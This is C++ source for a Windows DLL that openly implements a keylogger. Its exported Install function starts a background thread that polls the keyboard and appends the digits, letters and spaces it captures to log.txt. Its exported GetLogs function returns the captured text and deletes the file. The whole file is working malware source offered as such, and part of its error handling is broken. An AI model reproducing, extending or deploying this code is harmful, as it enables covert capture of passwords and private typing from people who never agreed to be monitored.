// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#pragma comment (lib, "user32.lib")

using namespace std;
void StartLogging();

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) const char* Install()
{
	cout << "Keylogger Installed\n";
	CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)&StartLogging, NULL, 0, NULL);
    return "GetLogs";
	
}

void Log(char Key)
{
	FILE* f = fopen("log.txt", "a");
	fwrite(&Key, 1, 1, f);
	fclose(f);

}
void Log(char* Sentence)
{
	FILE* f = fopen("log.txt", "a");
	fwrite(Sentence, strlen(Sentence), 1, f);
	fclose(f);
}

const char* SHIFT_NUMS = ")!@#$%^&*(";

void StartLogging()
{
	char KEY = '\x00';
	cout << "Loop is starting\n";
	while (true)
	{
		BOOL SHIFT = false;
		BOOL CAPS = false;

		//Get SHIFT & CAPS Lock
		if (GetAsyncKeyState(VK_SHIFT))
			SHIFT = true;
		else
			SHIFT = false;

		if (GetAsyncKeyState(VK_CAPITAL))
			CAPS = !CAPS;

		//Numbers
		for (KEY = 0x30; KEY <= 0x39; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767)
			{
				//if one of them is true and the other is false (not both true and not both false)
				if (SHIFT)
				{
					Log(SHIFT_NUMS[KEY - 0x30]);
				}
				else
				{
					Log(KEY);
				}
			}
		}
		//Letters
		for (KEY = 0x41; KEY <= 0x5A; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767)
			{
				//if one of them is true and the other is false (not both true and not both false)
				if (CAPS ^ SHIFT)
				{
					Log(KEY);
				}
				else
				{
					Log(KEY + (char)0x20);
				}
			}
		}
		if (GetAsyncKeyState(VK_SPACE) == -32767)
			Log(' ');

		Sleep(10);
	}

	return;
}

extern "C" __declspec(dllexport) char* GetLogs()
{
	FILE* f = nullptr;
        errno_t err = fopen_s(&f, "log.txt", "r");
        if (err != 0 || f == nullptr) {
           // Handle error
           std::cerr << "Error opening file: log.txt\n";
           // Optionally, exit or return an error code
}

	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);
	char* Logs = (char*)malloc(fsize + 1);
	fread(Logs, 1, fsize, f);
	fclose(f);

	// Convert narrow string to wide string
	std::wstring wideFilePath = L"log.txt";

	// Clear the log file using DeleteFileW
	if (!DeleteFile(wideFilePath.c_str())) {
		std::cerr << "Failed to delete log file!\n";
	}

	return Logs;
}
